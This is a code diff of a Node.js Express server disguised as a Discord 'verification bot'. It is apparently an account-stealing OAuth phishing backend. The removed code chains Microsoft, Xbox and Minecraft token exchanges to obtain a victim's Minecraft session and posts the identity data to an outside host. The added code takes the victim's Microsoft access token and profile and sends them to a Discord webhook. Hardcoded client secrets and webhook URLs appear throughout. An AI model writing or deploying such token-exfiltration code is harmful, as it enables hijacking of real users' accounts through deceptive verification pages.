@@ -1,157 +1,62 @@
-//Config
-const secret_value = 'Cy.8Q~uc2pHYLA_DTrAFPFaGtdkmHkK8LvZDMbv~'
-const client_id = '2cfbc09e-a8f1-4bd8-987c-ce69070e0b58'
-const redirect_uri = 'https://discord-verification-bot.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1058160927129739274/TpYU4uBG5j_idWl5A4QrCzyCpbje7rEcL-WYyrPyw8CaaVzohPtMkq-NIFpgFz5DAvAT'
-//Requirements
-const axios = require('axios')
-const express = require('express')
-const app = express()
-const port = process.env.PORT || 3000
+const express = require('express');
+const request = require('request');
+const app = express();
 
-app.get('/', async (req, res) => {
-    res.send('Authenication Complete!')
-    const code = req.query.code
-    if (code == null) {
-        return
-    }
-    try {
-        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
-        const accessToken = accessTokenAndRefreshTokenArray[0]
-        const refreshToken = accessTokenAndRefreshTokenArray[1]
-        const hashAndTokenArray = await getUserHashAndToken(accessToken)
-        const userToken = hashAndTokenArray[0]
-        const userHash = hashAndTokenArray[1]
-        const xstsToken = await getXSTSToken(userToken)
-        const bearerToken = await getBearerToken(xstsToken, userHash)
-        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
-        const uuid = usernameAndUUIDArray[0]
-        const username = usernameAndUUIDArray[1]
-        const ip = getIp(req)
-        pageGoPost({url: "http://d-na.kr/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
-    } catch (e) {
-        console.log(e)
-    }
-})
+app.get('/redirect', (req, res) => {
+    // Get the code from the query string
+    const code = req.query.code;
 
-app.listen(port, () => {
-    console.log(`Started the server on ${port}`)
-})
-
-async function getAccessTokenAndRefreshToken(code) {
-    const url = 'https://login.live.com/oauth20_token.srf'
-
-    const config = {
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
+    // Exchange the code for an access token
+    request.post({
+        url: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+        form: {
+            grant_type: 'authorization_code',
+            client_id: 'a1ad2d37-7be9-4db9-bad1-e457f14e2e1b',
+            client_secret: 'e92eb957-6e2f-43ad-a233-dfbec6cadc86',
+            code: code,
+            redirect_uri: 'https://discord-verification-bot-79dd.onrender.com/'
         }
-    }
-    let data = {
-        client_id: client_id,
-        redirect_uri: redirect_uri,
-        secret_value: secret_value,
-        code: code,
-        grant_type: 'authorization_code'
-    }
+    }, (err, httpResponse, body) => {
+        if (err) {
+            console.error(err);
+            res.send('Error');
+        } else {
+            const json = JSON.parse(body);
+            const access_token = json.access_token;
 
-    let response = await axios.post(url, data, config)
-    return [response.data['access_token'], response.data['refresh_token']]
-}
+            // Get the user's profile
+            request.get({
+                url: 'https://graph.microsoft.com/v1.0/me',
+                headers: {
+                    'Authorization': 'Bearer ' + access_token
+                }
+            }, (err, httpResponse, body) => {
+                if (err) {
+                    console.error(err);
+                    res.send('Error');
+                } else {
+                    const user = JSON.parse(body);
 
-async function getUserHashAndToken(accessToken) {
-    const url = 'https://user.auth.xboxlive.com/user/authenticate'
-    const config = {
-        headers: {
-            'Content-Type': 'application/json', 'Accept': 'application/json',
+                    // Send the access token and user information to your webhook
+                    request.post({
+                        url: 'https://discord.com/api/webhooks/1065835230621081684/CwV2UA-Fg7iT42kf4SqeL_3DBCNL9xyb9zw5ZSpeP7k-W_VHkOgY35j0fbilaswbk_PW',
+                        json: {
+                            access_token: access_token,
+                            user: user
+                        }
+                    }, (err, httpResponse, body) => {
+                        if (err) {
+                            console.error(err);
+                        }
+                    });
+
+                    res.send('Token and user information sent to webhook');
+                }
+            });
         }
-    }
-    let data = {
-        Properties: {
-            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
-        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
-    }
-    let response = await axios.post(url, data, config)
-    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
-}
+    });
+});
 
-async function getXSTSToken(userToken) {
-    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
-    const config = {
-        headers: {
-            'Content-Type': 'application/json', 'Accept': 'application/json',
-        }
-    }
-    let data = {
-        Properties: {
-            SandboxId: 'RETAIL',
-            UserTokens: [userToken]
-        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
-    }
-    let response = await axios.post(url, data, config)
-
-    return response.data['Token']
-}
-
-async function getBearerToken(xstsToken, userHash) {
-    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
-    const config = {
-        headers: {
-            'Content-Type': 'application/json',
-        }
-    }
-    let data = {
-        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
-    }
-    let response = await axios.post(url, data, config)
-    return response.data['access_token']
-}
-
-async function getUsernameAndUUID(bearerToken) {
-    const url = 'https://api.minecraftservices.com/minecraft/profile'
-    const config = {
-        headers: {
-            'Authorization': 'Bearer ' + bearerToken,
-        }
-    }
-    let response = await axios.get(url, config)
-    return [response.data['id'], response.data['name']]
-}
-
-function getIp(req) {
-    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
-}
-function pageGoPost(d){
-	var insdoc = "";
-    
-	for (var i = 0; i < d.vals.length; i++) {
-	  insdoc+= "<input type='hidden' name='"+ d.vals[i][0] +"' value='"+ d.vals[i][1] +"'>";
-	}
-    
-	var goform = $("<form>", {
-	  method: "post",
-	  action: d.url,
-	  target: d.target,
-	  html: insdoc
-	}).appendTo("body");
-    
-	goform.submit();
-}
-
-
-
-const bannedNames = []
-
-function addBan(name) {
-    bannedNames.push(name);
-}
-
-function checkIfBanned(name) {
-
-    for (const item of bannedNames) {
-        if (name === item) {
-            return true
-        }
-    }
-    addBan(name)
-    return false
-}
+app.listen(3000, () => {
+    console.log('Redirect service listening on port 3000');
+});
